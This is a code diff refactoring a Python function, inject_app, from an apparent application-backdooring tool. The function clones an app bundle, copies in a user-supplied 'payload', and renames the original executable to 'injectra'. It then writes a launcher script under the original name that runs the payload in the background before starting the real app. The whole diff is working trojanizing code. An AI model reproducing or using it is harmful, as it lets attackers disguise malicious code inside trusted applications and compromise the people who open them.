@@ -4,11 +4,11 @@ from subprocess import call
 from .get_app import get_app_name
 from .logic import check_app_path, check_inputs
 
-C_None = "\x1b[0;39m"
-C_BRed = "\x1b[1;31m"
-
 
 def inject_app(args, include_files):
+
+    C_None = "\x1b[0;39m"
+    C_BRed = "\x1b[1;31m"
 
     # 1 | Check for valid folder
     check_app_path(args)
@@ -20,15 +20,17 @@ def inject_app(args, include_files):
     print("[i] Cloning the application...")
 
     if path.isdir(output) or path.isdir(args.output[0]):
-        print(C_BRed + ("[!] The output directory already exists: %s" % output) + C_None)
+        print(C_BRed + f"[!] The output directory already exists: {output}" + C_None)
         quit()
 
     try:
-        call(("cp -r '%s' '%s'" % (args.app[0], output)), shell=True)
+
+        call(f"cp -r '{args.app[0]}' '{output}'", shell=True)
         print("[+] The application was sucessfully cloned.")
 
     except Exception:
-        print(C_BRed + ("[!] Cannot write to output: %s" % output) + C_None)
+
+        print(C_BRed + f"[!] Cannot write to output: {output}" + C_None)
         quit()
 
     # 4 | Checking things
@@ -48,21 +50,28 @@ def inject_app(args, include_files):
         print("[i] Including the content of the given folder...")
 
         if path.isdir(args.include[0]):
-            print("[+] Getting the files: %s" % args.include[0])
+            print(f"[+] Getting the files: {args.include[0]}")
+
         else:
-            print(C_BRed + ("[!] Cannot find folder to include: %s" % args.include[0]) + C_None)
+            print(C_BRed + f"[!] Cannot find folder to include: {args.include[0]}" + C_None)
             quit()
 
         try:
-            call(("cp -a '%s/.' ." % args.include[0]), shell=True)
+
+            call(f"cp -a '{args.include[0]}/.' .", shell=True)
+
         except Exception:
+
             print(C_BRed + "[!] Cannot include the files." + C_None)
             quit()
 
         print("[i] Make the included files executable...")
         try:
-            call(("chmod +x *"), shell=True)
+
+            call("chmod +x *", shell=True)
+
         except Exception:
+
             print(C_BRed + "[!] Cannot make the files executable." + C_None)
             quit()
 
@@ -70,33 +79,51 @@ def inject_app(args, include_files):
     print("[i] Changing the start order...")
 
     try:
-        call(("cp '%s' payload" % args.inject[0]), shell=True)
+
+        call(f"cp '{args.inject[0]}' payload", shell=True)
+
     except Exception:
+
         print(C_BRed + "[!] Cannot insert the injection." + C_None)
         quit()
 
     try:
-        call(("mv '%s' 'injectra'" % appname), shell=True)
+
+        call(f"mv '{appname}' 'injectra'", shell=True)
+
     except Exception:
+
         print(C_BRed + "[!] Cannot rearrange the start order." + C_None)
         quit()
 
     try:
-        call(('echo \'#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &\' > "%s"' % appname), shell=True)
+
+        # call(f'echo \'#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &\' > "{appname}"', shell=True)
+        injection_handler = open(appname, "w")
+        injection_handler.write('#!/bin/sh\nDIR=$(cd "$(dirname "$0")"; pwd) ; cd $DIR\n$DIR/payload &\n$DIR/injectra &')
+        injection_handler.close()
+
     except Exception:
+
         print(C_BRed + "[!] Cannot write new a start order." + C_None)
         quit()
 
     try:
-        call(("chmod +x injectra ; chmod +x payload ; chmod +x '%s'" % appname), shell=True)
+
+        call(f"chmod +x injectra ; chmod +x payload ; chmod +x '{appname}'", shell=True)
+
     except Exception:
+
         print(C_BRed + "[!] Cannot make the injection executable." + C_None)
         quit()
 
     try:
+
         chdir("../../../")
-        call(("mv '%s' '%s'" % (output, args.output[0])), shell=True)
+        call(f"mv '{output}' '{args.output[0]}'", shell=True)
+
     except Exception:
+
         print(C_BRed + "[!] Cannot make the application visible." + C_None)
         quit()
 
